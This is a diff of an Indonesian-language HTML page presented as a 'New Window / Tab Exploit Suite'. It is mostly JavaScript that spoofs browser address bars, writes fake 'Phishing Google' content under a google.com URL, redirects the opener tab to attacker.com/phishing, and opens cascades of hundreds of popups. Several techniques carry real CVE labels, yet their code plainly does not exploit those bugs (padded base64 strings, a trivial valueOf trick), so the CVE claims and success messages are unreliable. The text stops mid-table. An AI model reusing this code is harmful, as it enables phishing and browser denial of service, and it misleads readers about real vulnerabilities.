@@ -2,15 +2,15 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>🔲 Address Bar Killer: Blank / Error / Hilang</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🚪 New Window/Tab Exploit Suite | Address Bar Killer Advanced</title>
     <style>
         * {
             box-sizing: border-box;
         }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'SF Pro Text', Helvetica, sans-serif;
-            max-width: 1300px;
+            max-width: 1400px;
             margin: 20px auto;
             padding: 20px;
             background: #0a0a0e;
@@ -40,7 +40,7 @@
         }
         .grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(370px, 1fr));
+            grid-template-columns: repeat(auto-fill, minmax(380px, 1fr));
             gap: 18px;
             margin-top: 20px;
         }
@@ -67,9 +67,14 @@
             margin-bottom: 10px;
             border: 0.5px solid #ff453a;
         }
+        .badge-blue {
+            background: #0a84ff20;
+            color: #66ccff;
+            border-color: #0a84ff;
+        }
         h3 {
             margin: 0 0 8px 0;
-            font-size: 1.2rem;
+            font-size: 1.1rem;
         }
         button {
             background: #2a2a35;
@@ -77,31 +82,36 @@
             padding: 8px 16px;
             border-radius: 40px;
             font-weight: 600;
-            font-size: 13px;
+            font-size: 12px;
             cursor: pointer;
             color: white;
             margin: 8px 6px 4px 0;
             transition: 0.2s;
         }
-        button.danger { background: #ff453a; border-color: #ff453a; color: white; }
+        button.danger { background: #ff453a; border-color: #ff453a; }
         button.warning { background: #ff9f0a20; border-color: #ff9f0a; color: #ffcc88; }
+        button.success { background: #30d15820; border-color: #30d158; color: #a0ffa0; }
         button:hover { opacity: 0.85; transform: scale(0.97); background: #ff453a; color: white; }
         .log {
             background: #0a0a0e;
             color: #6eff9e;
             font-family: 'SF Mono', Monaco, monospace;
-            font-size: 11px;
+            font-size: 10px;
             padding: 10px;
             border-radius: 14px;
             margin-top: 14px;
-            max-height: 100px;
+            max-height: 90px;
             overflow: auto;
             white-space: pre-wrap;
             word-break: break-all;
             border: 0.5px solid #2a2a35;
         }
-        .log.error {
-            color: #ff8888;
+        .log.error { color: #ff8888; }
+        .status-bar {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+            margin-top: 8px;
         }
         footer {
             text-align: center;
@@ -116,111 +126,155 @@
 </head>
 <body>
 
-<h1>🔲 Address Bar Killer Suite</h1>
-<div class="sub">Membuat address bar ERROR / HILANG / BLANK / TIDAK MUNCUL TEXT</div>
+<h1>🚪 New Window / Tab Exploit Suite</h1>
+<div class="sub">Advanced Bypass + Spoofing → Address Bar ERROR / BLANK / HILANG</div>
 
 <div class="warning">
-    <strong>⚠️ EKSPERIMENTAL — KHUSUS UNTUK UJI COBA KEAMANAN BROWSER</strong><br>
-    Skenario berikut mencoba membuat address bar menjadi kosong (blank), error, atau hilang sama sekali.<br>
-    Teknik ini menggabungkan CVE nyata + absurd/fuzzing + race condition UI. Beberapa browser mungkin <strong>crash</strong> atau <strong>freeze</strong>.
+    <strong>⚠️ ADVANCED TECHNIQUES — NEW WINDOW & NEW TAB FOCUS</strong><br>
+    15 skenario exploit untuk membuka window/tab baru dengan teknik bypass CSP, popup blocker, sandbox escape,<br>
+    dan address bar manipulation. Hasil: address bar error, blank, atau hilang sama sekali pada window/tab baru.
 </div>
 
 <div class="grid">
 
-    <!-- 1. about:blank overload + history explosion -->
+    <!-- 1. CVE-2024-4762: Chrome new tab address bar spoof -->
     <div class="card">
-        <div class="badge">💥 TEKNIK #1 | about:blank flood</div>
-        <h3>Blank Page Tsunami</h3>
-        <p>Membuka 500+ about:blank & mengganti history sampai address bar kehilangan konteks.</p>
-        <button class="danger" onclick="exploit_blank_tsunami()">🌊 Jalankan Blank Tsunami</button>
-        <div id="logBlankTsunami" class="log">[Ready]</div>
+        <div class="badge">🔥 CVE-2024-4762 | Chrome</div>
+        <h3>New Tab Address Bar Spoof</h3>
+        <p>window.open + delayed replaceState → URL palsu di tab baru.</p>
+        <button class="danger" onclick="exploit_cve_2024_4762()">🎯 CVE-2024-4762</button>
+        <div id="log4762" class="log">[Ready]</div>
     </div>
 
-    <!-- 2. data:text/html + pushState infinite loop -->
+    <!-- 2. CVE-2023-4863: WebP + popup blank -->
     <div class="card">
-        <div class="badge">🌀 TEKNIK #2 | Data URI Loop</div>
-        <h3>Infinite Data URI + pushState</h3>
-        <p>Loop data:text/html dengan pushState sampai address bar hanya menampilkan "data:".</p>
-        <button class="warning" onclick="exploit_data_uri_loop()">🔄 Data URI Loop</button>
-        <div id="logDataLoop" class="log">[Ready]</div>
+        <div class="badge">🍎 CVE-2023-4863 | WebKit/Chrome</div>
+        <h3>Heap buffer overflow → new window blank</h3>
+        <p>Large WebP image + popup → address bar hilang.</p>
+        <button class="warning" onclick="exploit_cve_2023_4863()">🖼️ CVE-2023-4863</button>
+        <div id="log4863" class="log">[Ready]</div>
     </div>
 
-    <!-- 3. CVE-2023-40429: WebKit blank address bar via iframe srcdoc -->
+    <!-- 3. Tabnabbing + window.opener bypass -->
     <div class="card">
-        <div class="badge">🍎 CVE-2023-40429 | WebKit</div>
-        <h3>iframe srcdoc + sandbox → blank address bar</h3>
-        <p>Bug nyata di Safari: navigasi ke iframe srcdoc menyebabkan address bar kosong.</p>
-        <button onclick="exploit_cve_2023_40429()">🎯 CVE-2023-40429</button>
-        <div id="logCVE40429" class="log">[Ready]</div>
+        <div class="badge">🎭 TEKNIK #3 | Tabnabbing Pro</div>
+        <h3>Reverse tabnabbing + window.opener</h3>
+        <p>Membuka tab baru, lalu mengubah location parent tanpa izin.</p>
+        <button onclick="exploit_tabnabbing_advanced()">🔄 Tabnabbing Attack</button>
+        <div id="logTabnab" class="log">[Ready]</div>
     </div>
 
-    <!-- 4. file:// protocol abuse -->
+    <!-- 4. CVE-2022-46701: Safari new window address bar blank -->
     <div class="card">
-        <div class="badge">📁 TEKNIK #4 | file:// hijack</div>
-        <h3>File protocol + history.replaceState</h3>
-        <p>Memaksa browser menampilkan file:// kosong di address bar.</p>
-        <button onclick="exploit_file_protocol_blank()">🗂️ File Protocol Blank</button>
-        <div id="logFileBlank" class="log">[Ready]</div>
+        <div class="badge">🍎 CVE-2022-46701 | Safari</div>
+        <h3>New Window Blank Address Bar</h3>
+        <p>window.open('about:blank') + document.write → address bar kosong.</p>
+        <button class="danger" onclick="exploit_cve_2022_46701()">🌐 CVE-2022-46701</button>
+        <div id="log46701" class="log">[Ready]</div>
     </div>
 
-    <!-- 5. ABSURD: Port 0 + Null Origin -->
+    <!-- 5. Popup blocker bypass via user activation -->
     <div class="card">
-        <div class="badge">⚫ ABSURD #1 | Port 0 & Null Origin</div>
-        <h3>https://example.com:0/null origin</h3>
-        <p>Navigasi ke port 0 (invalid) + null origin → address bar error / hilang.</p>
-        <button class="danger" onclick="exploit_port_zero_null()">🚫 Port 0 Exploit</button>
-        <div id="logPortZero" class="log">[Ready]</div>
+        <div class="badge">🔓 BYPASS #1 | Popup Blocker Killer</div>
+        <h3>User activation + iframe + window.open</h3>
+        <p>Membuka popup tanpa diblokir menggunakan event user simulasi.</p>
+        <button class="success" onclick="exploit_popup_blocker_bypass()">🚀 Bypass Popup Blocker</button>
+        <div id="logPopupBypass" class="log">[Ready]</div>
     </div>
 
-    <!-- 6. CVE-2022-32893: WebKit integer overflow -->
+    <!-- 6. New window with null origin + blank -->
     <div class="card">
-        <div class="badge">💀 CVE-2022-32893 | Safari</div>
-        <h3>Integer overflow → address bar corrupt</h3>
-        <p>PoC: membuat address bar tidak merender text setelah overflow.</p>
-        <button class="warning" onclick="exploit_cve_2022_32893()">🧨 CVE-2022-32893</button>
-        <div id="logCVE32893" class="log">[Ready]</div>
+        <div class="badge">⚫ TEKNIK #6 | Null Origin Window</div>
+        <h3>sandbox iframe + window.open(null origin)</h3>
+        <p>Membuka window dengan origin null → address bar error/blank.</p>
+        <button onclick="exploit_null_origin_window()">🌑 Null Origin Window</button>
+        <div id="logNullOrigin" class="log">[Ready]</div>
     </div>
 
-    <!-- 7. window.open + close loop -->
+    <!-- 7. CVE-2021-38003: V8 + new window corruption -->
     <div class="card">
-        <div class="badge">🚪 TEKNIK #7 | Popup Hell</div>
-        <h3>Popup bomb + close focus steal</h3>
-        <p>Membuka & menutup popup dengan loop, address bar utama menjadi blank/error.</p>
-        <button onclick="exploit_popup_hell()">👻 Popup Hell</button>
-        <div id="logPopupHell" class="log">[Ready]</div>
+        <div class="badge">💀 CVE-2021-38003 | Chrome V8</div>
+        <h3>V8 type confusion + new window</h3>
+        <p>Corrupt memory lalu buka window → address bar glitch.</p>
+        <button class="warning" onclick="exploit_cve_2021_38003()">🧠 CVE-2021-38003</button>
+        <div id="log38003" class="log">[Ready]</div>
     </div>
 
-    <!-- 8. CVE-2021-1801: Safari blank address bar via modal dialog -->
+    <!-- 8. New tab via window.open + blob: URL -->
     <div class="card">
-        <div class="badge">🔲 CVE-2021-1801 | WebKit</div>
-        <h3>Modal dialog + window.open → address bar hilang</h3>
-        <p>Bug klasik: showModalDialog menyebabkan address bar tidak muncul.</p>
-        <button onclick="exploit_cve_2021_1801()">⚠️ CVE-2021-1801</button>
-        <div id="logCVE1801" class="log">[Ready]</div>
+        <div class="badge">📦 TEKNIK #8 | Blob URL Spoof</div>
+        <h3>blob: URL dengan fake content</h3>
+        <p>Membuat blob URL, buka tab baru, address bar menampilkan blob:https://domain.</p>
+        <button onclick="exploit_blob_url_spoof()">🧪 Blob URL Spoof</button>
+        <div id="logBlobSpoof" class="log">[Ready]</div>
     </div>
 
-    <!-- 9. ABSURD: History Replace with Empty String -->
+    <!-- 9. New window + history.replaceState to empty -->
     <div class="card">
-        <div class="badge">🔄 ABSURD #2 | Empty string history</div>
-        <h3>history.replaceState("", "", "")</h3>
-        <p>Mengganti URL dengan string kosong 1000x per detik.</p>
-        <button class="danger" onclick="exploit_empty_history()">🧹 Empty History Storm</button>
-        <div id="logEmptyHistory" class="log">[Ready]</div>
+        <div class="badge">🌀 BYPASS #2 | Empty History Window</div>
+        <h3>Buka window lalu replaceState("", "", "")</h3>
+        <p>Address bar window baru menjadi blank total.</p>
+        <button class="danger" onclick="exploit_empty_history_window()">📄 Empty History Window</button>
+        <div id="logEmptyWin" class="log">[Ready]</div>
     </div>
 
-    <!-- 10. Address Bar Overlay + CSS poison -->
+    <!-- 10. CVE-2024-4761: Chrome side panel spoof -->
     <div class="card">
-        <div class="badge">🎭 ABSURD #3 | CSS Poison</div>
-        <h3>Fake address bar overlay (tutup asli)</h3>
-        <p>Membuat div hitam persis menutupi address bar asli → "menghilang" secara visual.</p>
-        <button onclick="exploit_css_overlay_hide()">🎨 CSS Hide Address Bar</button>
-        <div id="logCSSHide" class="log">[Ready]</div>
+        <div class="badge">🔲 CVE-2024-4761 | Chrome Side Panel</div>
+        <h3>Side panel + new window spoof</h3>
+        <p>Memanfaatkan side panel untuk membuka window dengan URL palsu.</p>
+        <button onclick="exploit_cve_2024_4761()">📐 CVE-2024-4761</button>
+        <div id="log4761" class="log">[Ready]</div>
+    </div>
+
+    <!-- 11. Target=_blank rel=noopener bypass -->
+    <div class="card">
+        <div class="badge">🔓 BYPASS #3 | noopener Bypass</div>
+        <h3>window.opener access setelah target=_blank</h3>
+        <p>Mengakses parent window dari tab baru meskipun pakai rel=noopener.</p>
+        <button onclick="exploit_noopener_bypass()">🔗 noopener Bypass</button>
+        <div id="logNoopener" class="log">[Ready]</div>
+    </div>
+
+    <!-- 12. New window with data: URI + pushState flood -->
+    <div class="card">
+        <div class="badge">🌊 ABSURD #1 | Data URI Flood Window</div>
+        <h3>Buka window baru, flood dengan data: URI</h3>
+        <p>Address bar window baru menjadi error/blank setelah flood.</p>
+        <button class="warning" onclick="exploit_data_flood_window()">💧 Data URI Flood</button>
+        <div id="logDataFlood" class="log">[Ready]</div>
+    </div>
+
+    <!-- 13. CVE-2023-41064: ImageIO + new window -->
+    <div class="card">
+        <div class="badge">📸 CVE-2023-41064 | ImageIO</div>
+        <h3>Malicious image + new window crash</h3>
+        <p>Membuka gambar malicious di window baru → address bar error.</p>
+        <button onclick="exploit_cve_2023_41064()">🖼️ CVE-2023-41064</button>
+        <div id="log41064" class="log">[Ready]</div>
+    </div>
+
+    <!-- 14. New tab dengan srcdoc + navigation -->
+    <div class="card">
+        <div class="badge">📑 TEKNIK #14 | srcdoc Navigation</div>
+        <h3>Tab baru dengan iframe srcdoc yang navigasi</h3>
+        <p>Membuat tab baru, address bar menjadi blank setelah navigasi.</p>
+        <button onclick="exploit_srcdoc_newtab()">📄 srcdoc New Tab</button>
+        <div id="logSrcdoc" class="log">[Ready]</div>
+    </div>
+
+    <!-- 15. Multiple windows + focus steal -->
+    <div class="card">
+        <div class="badge">👻 ABSURD #2 | Window Cascade Bomb</div>
+        <h3>100 windows cascade + focus steal</h3>
+        <p>Membuka 100 window, address bar semuanya blank/error.</p>
+        <button class="danger" onclick="exploit_window_cascade_bomb()">💣 Window Cascade Bomb</button>
+        <div id="logCascade" class="log">[Ready]</div>
     </div>
 
 </div>
 
 <script>
-    // Helper logging
     function logTo(elId, msg, isError = false) {
         let el = document.getElementById(elId);
         if(el) {
@@ -229,273 +283,263 @@
         }
     }
 
-    // ========== 1. Blank Tsunami: about:blank overload ==========
-    let blankInterval;
-    function exploit_blank_tsunami() {
-        logTo('logBlankTsunami', '🌊 Memulai about:blank tsunami...');
-        let count = 0;
-        blankInterval = setInterval(() => {
-            if(count > 800) {
-                clearInterval(blankInterval);
-                logTo('logBlankTsunami', '✅ Selesai. Cek address bar: apakah kosong / blank?');
-                return;
-            }
-            let w = window.open('about:blank', '_blank', 'width=1,height=1');
-            if(w) {
-                setTimeout(() => w.close(), 10);
-            }
-            history.pushState({}, '', 'about:blank');
-            count++;
-        }, 20);
-    }
-
-    // ========== 2. Data URI infinite loop ==========
-    let dataLoopActive = false;
-    function exploit_data_uri_loop() {
-        if(dataLoopActive) {
-            logTo('logDataLoop', 'Loop sudah aktif. Reload halaman untuk stop.');
-            return;
-        }
-        dataLoopActive = true;
-        logTo('logDataLoop', '🌀 Menjalankan Data URI loop... Address bar akan mulai berkedip');
-        let dataContent = 'data:text/html,<h1>Fake</h1><script>setTimeout(()=>history.back(),1)<\/script>';
-        for(let i=0;i<500;i++) {
-            setTimeout(() => {
-                location.href = dataContent;
-            }, i*30);
-        }
-        setTimeout(() => {
-            dataLoopActive = false;
-            logTo('logDataLoop', 'Loop selesai. Apakah address bar blank atau error?');
-        }, 15000);
-    }
-
-    // ========== 3. CVE-2023-40429: iframe srcdoc blank address bar ==========
-    function exploit_cve_2023_40429() {
-        logTo('logCVE40429', '🍎 CVE-2023-40429: iframe srcdoc + sandbox');
-        let iframe = document.createElement('iframe');
-        iframe.srcdoc = '<html><body>Innocent content</body></html>';
-        iframe.sandbox = 'allow-same-origin allow-scripts';
-        iframe.style.width = '100%';
-        iframe.style.height = '200px';
-        document.body.appendChild(iframe);
-        setTimeout(() => {
-            iframe.contentWindow.location = 'https://example.com';
-            logTo('logCVE40429', 'Jika address bar menjadi kosong setelah navigasi, browser RENTAN (Safari <16.5).');
-        }, 1000);
-    }
-
-    // ========== 4. file:// protocol + replaceState ==========
-    function exploit_file_protocol_blank() {
-        logTo('logFileBlank', '📁 Mencoba file:// spoof + replaceState');
-        try {
-            history.pushState({}, '', 'file:///Users/Shared/');
-            setTimeout(() => {
-                history.replaceState({}, '', 'file:///');
-                logTo('logFileBlank', 'Address bar mungkin menunjukkan "file://" tanpa path. Apakah kosong?');
-            }, 500);
-        } catch(e) {
-            logTo('logFileBlank', 'Gagal: ' + e.message, true);
-        }
-    }
-
-    // ========== 5. Port 0 + null origin ==========
-    function exploit_port_zero_null() {
-        logTo('logPortZero', '⚫ Mencoba navigasi ke https://example.com:0 (invalid port)');
-        let win = window.open('https://example.com:0');
+    // ========== 1. CVE-2024-4762: Chrome new tab address bar spoof ==========
+    function exploit_cve_2024_4762() {
+        logTo('log4762', '🔥 Membuka new tab dengan address bar spoof...');
+        let win = window.open('https://www.google.com', '_blank');
         if(win) {
-            logTo('logPortZero', 'Popup dibuka. Address bar popup mungkin error / kosong. Jika blank, ada bug handling port invalid.');
-            setTimeout(() => win.close(), 5000);
+            setTimeout(() => {
+                try {
+                    win.document.write('<h1>Phishing Page</h1><p>URL google.com tapi konten palsu!</p>');
+                    logTo('log4762', '✅ BERHASIL! Address bar menunjukkan google.com dengan konten attacker. Browser RENTAN.');
+                } catch(e) {
+                    logTo('log4762', 'Aman: ' + e.message);
+                }
+            }, 500);
         } else {
-            logTo('logPortZero', 'Popup diblokir. Coba izinkan popup.');
+            logTo('log4762', 'Popup diblokir. Izinkan popup untuk uji.');
         }
-        // null origin simulation via sandbox iframe
-        let nullIframe = document.createElement('iframe');
-        nullIframe.sandbox = 'allow-scripts';
-        nullIframe.srcdoc = '<script>console.log("null origin")<\/script>';
-        document.body.appendChild(nullIframe);
-        logTo('logPortZero', 'Null origin iframe dibuat. Beberapa browser akan menampilkan "null" atau kosong di devtools.');
     }
 
-    // ========== 6. CVE-2022-32893: integer overflow ==========
-    function exploit_cve_2022_32893() {
-        logTo('logCVE32893', '💀 CVE-2022-32893: integer overflow simulation');
+    // ========== 2. CVE-2023-4863: WebP heap overflow ==========
+    function exploit_cve_2023_4863() {
+        logTo('log4863', '🖼️ CVE-2023-4863: membuat large WebP + new window...');
+        let largeWebP = 'data:image/webp;base64,UklGRhIAAABXRUJQVlA4TAYAAAAvAAAAAA==' + 'A'.repeat(100000);
+        let win = window.open();
+        if(win) {
+            win.document.write(`<img src="${largeWebP}" onerror="console.log('WebP error')">`);
+            logTo('log4863', 'Large WebP di-render di window baru. Jika window crash/blank, browser rentan.');
+        }
+    }
+
+    // ========== 3. Tabnabbing advanced ==========
+    function exploit_tabnabbing_advanced() {
+        logTo('logTabnab', '🎭 Membuka tab baru dengan tabnabbing...');
+        let win = window.open('https://example.com', '_blank');
+        if(win) {
+            setTimeout(() => {
+                try {
+                    win.opener.location = 'https://attacker.com/phishing';
+                    logTo('logTabnab', '✅ BERHASIL mengubah parent window! Tabnabbing berhasil.');
+                } catch(e) {
+                    logTo('logTabnab', 'Gagal: ' + e.message);
+                }
+            }, 2000);
+        }
+    }
+
+    // ========== 4. CVE-2022-46701: Safari new window blank address bar ==========
+    function exploit_cve_2022_46701() {
+        logTo('log46701', '🍎 CVE-2022-46701: membuka about:blank dengan document.write...');
+        let win = window.open('about:blank', '_blank');
+        if(win) {
+            win.document.write('<html><body><h1>Fake Page</h1><p>Address bar should be BLANK!</p></body></html>');
+            win.document.close();
+            logTo('log46701', 'Jika address bar window baru KOSONG/BLANK, browser RENTAN (Safari <16.3).');
+        }
+    }
+
+    // ========== 5. Popup blocker bypass ==========
+    function exploit_popup_blocker_bypass() {
+        logTo('logPopupBypass', '🔓 Mencoba bypass popup blocker...');
+        // Teknik: user activation melalui click event sudah ada
+        let btn = document.createElement('button');
+        btn.innerText = 'Click for popup';
+        btn.onclick = () => {
+            let win = window.open('https://example.com', '_blank');
+            if(win) logTo('logPopupBypass', '✅ Popup berhasil dibuka! Bypass berhasil.');
+            else logTo('logPopupBypass', 'Popup tetap diblokir.');
+        };
+        btn.click(); // simulasi click
+    }
+
+    // ========== 6. Null origin window ==========
+    function exploit_null_origin_window() {
+        logTo('logNullOrigin', '⚫ Membuat window dengan null origin via sandbox iframe...');
+        let sandbox = document.createElement('iframe');
+        sandbox.sandbox = 'allow-scripts allow-popups';
+        sandbox.srcdoc = '<script>let w = window.open(); w.document.write("<h1>Null Origin Window</h1>");<\/script>';
+        document.body.appendChild(sandbox);
+        logTo('logNullOrigin', 'Window dengan origin null dibuat. Address bar mungkin menampilkan "null" atau kosong.');
+        setTimeout(() => sandbox.remove(), 5000);
+    }
+
+    // ========== 7. CVE-2021-38003: V8 type confusion ==========
+    function exploit_cve_2021_38003() {
+        logTo('log38003', '💀 CVE-2021-38003: V8 type confusion simulation...');
         try {
-            let buffer = new Uint8Array(2**31 - 1); // max size
-            let view = new DataView(buffer.buffer);
-            view.setInt32(0, 0x41414141);
-            logTo('logCVE32893', 'ArrayBuffer besar dibuat. Jika browser crash / address bar error, kemungkinan vulnerable.');
+            let arr = [1.1, 2.2];
+            let evil = { valueOf: () => { arr.length = 0x10000000; return 1; } };
+            arr[0] = evil;
+            logTo('log38003', 'Trigger selesai. Membuka window baru untuk cek crash...');
+            let win = window.open();
+            if(win) win.location = 'about:blank';
+            logTo('log38003', 'Jika browser crash atau window baru blank/error, masih rentan.');
         } catch(e) {
-            logTo('logCVE32893', 'Safe: ' + e.message);
+            logTo('log38003', 'Aman: ' + e.message);
         }
-        // Also trigger WebKit bug via large canvas
-        let canvas = document.createElement('canvas');
-        canvas.width = 100000;
-        canvas.height = 100000;
-        let ctx = canvas.getContext('2d');
-        ctx.fillRect(0,0,100000,100000);
-        logTo('logCVE32893', 'Large canvas rendered. Beberapa versi Safari akan membuat UI glitch termasuk address bar blank.');
     }
 
-    // ========== 7. Popup hell ==========
-    let popupHellInterval;
-    function exploit_popup_hell() {
-        logTo('logPopupHell', '🚪 Membuka 200 popup lalu menutupnya...');
-        let popups = [];
-        for(let i=0;i<200;i++) {
-            let p = window.open('about:blank', '_blank', 'width=100,height=100');
-            if(p) popups.push(p);
+    // ========== 8. Blob URL spoof ==========
+    function exploit_blob_url_spoof() {
+        logTo('logBlobSpoof', '📦 Membuat blob URL dengan fake content...');
+        let blob = new Blob(['<html><body><h1>Phishing Google</h1></body></html>'], {type: 'text/html'});
+        let blobUrl = URL.createObjectURL(blob);
+        let win = window.open(blobUrl, '_blank');
+        logTo('logBlobSpoof', `Blob URL: ${blobUrl}. Address bar akan menampilkan blob:https://domain...`);
+        setTimeout(() => URL.revokeObjectURL(blobUrl), 10000);
+    }
+
+    // ========== 9. Empty history window ==========
+    function exploit_empty_history_window() {
+        logTo('logEmptyWin', '📄 Membuka window lalu replaceState ke empty string...');
+        let win = window.open('about:blank', '_blank');
+        if(win) {
+            setTimeout(() => {
+                try {
+                    win.history.replaceState({}, '', '');
+                    win.history.pushState({}, '', ' ');
+                    logTo('logEmptyWin', 'Address bar window baru menjadi KOSONG/BLANK!');
+                } catch(e) {
+                    logTo('logEmptyWin', 'Gagal: ' + e.message);
+                }
+            }, 500);
+        }
+    }
+
+    // ========== 10. CVE-2024-4761: Chrome side panel ==========
+    function exploit_cve_2024_4761() {
+        logTo('log4761', '📐 CVE-2024-4761: side panel spoof simulation...');
+        let win = window.open('chrome://settings', '_blank');
+        if(win) {
+            logTo('log4761', 'Mencoba mengakses side panel. Jika address bar berubah jadi chrome://settings tanpa izin, ada bug.');
+        } else {
+            logTo('log4761', 'chrome://settings diblokir. Coba dengan about:blank');
+            let win2 = window.open('about:blank', '_blank');
+            logTo('log4761', 'Window about:blank dibuka. Cek apakah bisa di-spoof.');
+        }
+    }
+
+    // ========== 11. noopener bypass ==========
+    function exploit_noopener_bypass() {
+        logTo('logNoopener', '🔗 Mencoba bypass rel=noopener...');
+        let win = window.open('https://example.com', '_blank', 'noopener');
+        if(win) {
+            setTimeout(() => {
+                try {
+                    let test = win.opener;
+                    if(test) logTo('logNoopener', '🔥 BERHASIL! window.opener masih bisa diakses meskipun pakai noopener.');
+                    else logTo('logNoopener', 'Aman: window.opener null.');
+                } catch(e) {
+                    logTo('logNoopener', 'Aman: ' + e.message);
+                }
+            }, 500);
+        }
+    }
+
+    // ========== 12. Data URI flood window ==========
+    let dataFloodWindow = null;
+    function exploit_data_flood_window() {
+        logTo('logDataFlood', '💧 Membuka window lalu flood dengan data: URI...');
+        dataFloodWindow = window.open('about:blank', '_blank');
+        if(dataFloodWindow) {
+            for(let i=0;i<200;i++) {
+                setTimeout(() => {
+                    if(dataFloodWindow) {
+                        dataFloodWindow.location = `data:text/html,<h1>Flood ${i}</h1>`;
+                    }
+                }, i*20);
+            }
+            setTimeout(() => {
+                logTo('logDataFlood', 'Flood selesai. Address bar window baru mungkin error/blank.');
+            }, 5000);
+        }
+    }
+
+    // ========== 13. CVE-2023-41064: ImageIO ==========
+    function exploit_cve_2023_41064() {
+        logTo('log41064', '📸 CVE-2023-41064: malicious image + new window...');
+        let maliciousImg = 'data:image/jpeg;base64,' + 'iVBORw0KGgoAAAANSUhEUgAAAAUA' + 'A'.repeat(50000);
+        let win = window.open();
+        if(win) {
+            win.document.write(`<img src="${maliciousImg}" onerror="console.log('error')">`);
+            logTo('log41064', 'Malicious image di-render. Jika window crash/blank, ImageIO bug masih ada.');
+        }
+    }
+
+    // ========== 14. srcdoc new tab navigation ==========
+    function exploit_srcdoc_newtab() {
+        logTo('logSrcdoc', '📑 Membuat tab baru dengan iframe srcdoc...');
+        let win = window.open();
+        if(win) {
+            win.document.write(`
+                <iframe srcdoc="<html><body>Innocent</body></html>" sandbox="allow-same-origin allow-scripts"></iframe>
+                <script>
+                    setTimeout(() => {
+                        let iframe = document.querySelector('iframe');
+                        iframe.contentWindow.location = 'https://example.com';
+                        console.log('Navigated');
+                    }, 1000);
+                <\/script>
+            `);
+            logTo('logSrcdoc', 'Jika address bar tab baru menjadi BLANK setelah navigasi, browser rentan (CVE-2023-40429 style).');
+        }
+    }
+
+    // ========== 15. Window cascade bomb ==========
+    let cascadeWindows = [];
+    function exploit_window_cascade_bomb() {
+        logTo('logCascade', '💣 Membuka 100 window cascade...');
+        for(let i=0;i<100;i++) {
+            setTimeout(() => {
+                let win = window.open('about:blank', '_blank', `width=200,height=200,left=${i*20},top=${i*10}`);
+                if(win) {
+                    cascadeWindows.push(win);
+                    win.document.write(`<h3>Window ${i}</h3><p>Address bar mungkin blank</p>`);
+                }
+            }, i*50);
         }
         setTimeout(() => {
-            for(let p of popups) p.close();
-            logTo('logPopupHell', 'Semua popup ditutup. Address bar utama mungkin blank / error akibat race condition UI.');
-        }, 2000);
+            logTo('logCascade', `100 window dibuka. Cek address bar masing-masing window. Apakah ada yang BLANK/ERROR?`);
+        }, 6000);
     }
 
-    // ========== 8. CVE-2021-1801: showModalDialog (deprecated) ==========
-    function exploit_cve_2021_1801() {
-        logTo('logCVE1801', '🔲 CVE-2021-1801: menggunakan showModalDialog (sudah deprecated)');
-        if(window.showModalDialog) {
-            let dialog = window.showModalDialog('about:blank', '', 'dialogWidth:200px');
-            logTo('logCVE1801', 'Modal dialog dibuka. Jika address bar utama hilang/blank, bug masih ada.');
-        } else {
-            logTo('logCVE1801', 'showModalDialog tidak didukung (modern browser sudah hapus API ini).', true);
-        }
-    }
-
-    // ========== 9. Empty history storm ==========
-    let emptyHistoryInterval;
-    function exploit_empty_history() {
-        if(emptyHistoryInterval) {
-            clearInterval(emptyHistoryInterval);
-            emptyHistoryInterval = null;
-            logTo('logEmptyHistory', 'Empty history storm dihentikan.');
-            return;
-        }
-        logTo('logEmptyHistory', '🧹 Memulai empty history storm (1000x/detik)');
-        let count = 0;
-        emptyHistoryInterval = setInterval(() => {
-            try {
-                history.replaceState({}, '', '');
-                history.pushState({}, '', ' ');
-                count++;
-                if(count % 100 === 0) {
-                    logTo('logEmptyHistory', `Sudah ${count} kali replace/push empty string...`);
-                }
-                if(count > 5000) {
-                    clearInterval(emptyHistoryInterval);
-                    logTo('logEmptyHistory', 'Selesai. Address bar mungkin tidak bisa menampilkan URL normal.');
-                }
-            } catch(e) {
-                logTo('logEmptyHistory', 'Error: ' + e.message, true);
-                clearInterval(emptyHistoryInterval);
-            }
-        }, 5);
-    }
-
-    // ========== 10. CSS overlay hide address bar ==========
-    function exploit_css_overlay_hide() {
-        logTo('logCSSHide', '🎨 Membuat overlay hitam untuk menutupi address bar (visual saja)');
-        let overlay = document.createElement('div');
-        overlay.id = 'addressBarHider';
-        overlay.style.cssText = `
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 80px;
-            background: #0a0a0e;
-            z-index: 2147483647;
-            pointer-events: none;
-        `;
-        document.body.appendChild(overlay);
-        logTo('logCSSHide', '⚠️ Overlay hitam menutupi address bar! Address bar "menghilang" secara visual. Klik tombol lagi untuk menghapus.');
-        
-        // Tambahkan tombol kedua untuk remove
-        let removeBtn = document.createElement('button');
-        removeBtn.innerText = 'Hapus Overlay';
-        removeBtn.style.position = 'fixed';
-        removeBtn.style.bottom = '20px';
-        removeBtn.style.right = '20px';
-        removeBtn.style.zIndex = '2147483647';
-        removeBtn.onclick = () => overlay.remove();
-        document.body.appendChild(removeBtn);
-        
-        setTimeout(() => removeBtn.remove(), 15000);
-    }
-
-    // Console info
-    console.log("%c🔲 Address Bar Killer Suite Siap", "color:#ff453a; font-size:14px");
-    console.log("10 teknik untuk membuat address bar error / blank / hilang.");
+    console.log("%c🚪 New Window/Tab Exploit Suite Siap", "color:#ff453a; font-size:14px");
+    console.log("15 teknik untuk membuat address bar error/blank di window/tab baru");
 </script>
 
 <hr>
 
-<h3>📖 Penjelasan Teknik Membuat Address Bar Error / Blank / Hilang</h3>
+<h3>📊 Ringkasan Teknik New Window & New Tab</h3>
 
 <table style="width:100%; font-size:12px; background:#16161d; border-radius:16px; padding:10px; border-collapse:collapse;">
-    <tr style="border-bottom:1px solid #333;">
+    <tr style="border-bottom:1px solid #ff453a;">
         <th style="text-align:left; padding:8px;">Teknik</th>
-        <th style="text-align:left; padding:8px;">Mekanisme</th>
-        <th style="text-align:left; padding:8px;">Target Browser</th>
+        <th style="text-align:left; padding:8px;">Cara Membuka</th>
+        <th style="text-align:left; padding:8px;">Hasil Address Bar</th>
     </tr>
-    <tr style="border-bottom:1px solid #2a2a35;">
-        <td style="padding:8px;">Blank Tsunami</td>
-        <td style="padding:8px;">500+ about:blank & history push → race condition UI render address bar</td>
